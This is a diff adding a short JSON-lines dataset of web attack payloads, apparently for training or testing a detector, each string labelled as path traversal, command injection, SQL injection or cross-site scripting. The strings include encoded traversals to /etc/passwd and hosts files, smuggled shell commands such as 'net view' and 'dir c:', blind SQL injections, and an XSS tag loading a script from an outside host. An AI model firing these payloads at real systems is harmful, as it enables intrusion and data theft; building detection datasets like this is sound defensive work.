@@ -1,0 +1,18 @@
+{"value": "..../0x2fetc0x2fpasswd", "id": 10, "cls": "lfi"}
+{"value": "+dir+c:+|", "id": 24, "cls": "rce"}
+{"value": " AND 1=1", "id": 39, "cls": "sqli"}
+{"value": "y=<a>alert</a>;content[y](123)", "id": 49, "cls": "xss"}
+{"value": "..../%uEFC8..../%uEFC8..../%uEFC8..../%uEFC8..../%uEFC8etc%uEFC8issue", "id": 11, "cls": "lfi"}
+{"value": "+|+dir+c:/+|", "id": 25, "cls": "rce"}
+{"value": " HAVING 1=0#", "id": 40, "cls": "sqli"}
+{"value": "<layer id=xss src=\"http://ha.ckers.org/scriptlet.html\"></layer>", "id": 50, "cls": "xss"}
+{"value": "?.0x2fetc0x2fissue", "id": 12, "cls": "lfi"}
+{"value": "`true`", "id": 26, "cls": "rce"}
+{"value": "1;select * from generate_series(3341,3341,case when (3341=3072) then 1 else 0 end) limit 1--", "id": 41, "cls": "sqli"}
+{"value": "'';!--\"<crosssitescripting>=&{()}", "id": 51, "cls": "xss"}
+{"value": ".?%u2216etc%u2216passwd", "id": 13, "cls": "lfi"}
+{"value": "+|+dir+c:\",10,cmdi,anom $+|+dir+c:\"", "id": 27, "cls": "rce"}
+{"value": "1,(select * from generate_series(9108,9108,case when (9108=2900) then 1 else 0 end) limit 1)", "id": 42, "cls": "sqli"}
+{"value": "..../%bg%qf..../%bg%qf..../%bg%qf..../%bg%qf..../%bg%qf..../%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts", "id": 14, "cls": "lfi"}
+{"value": "& net view", "id": 28, "cls": "rce"}
+{"value": " AND 1=1-- ", "id": 43, "cls": "sqli"}
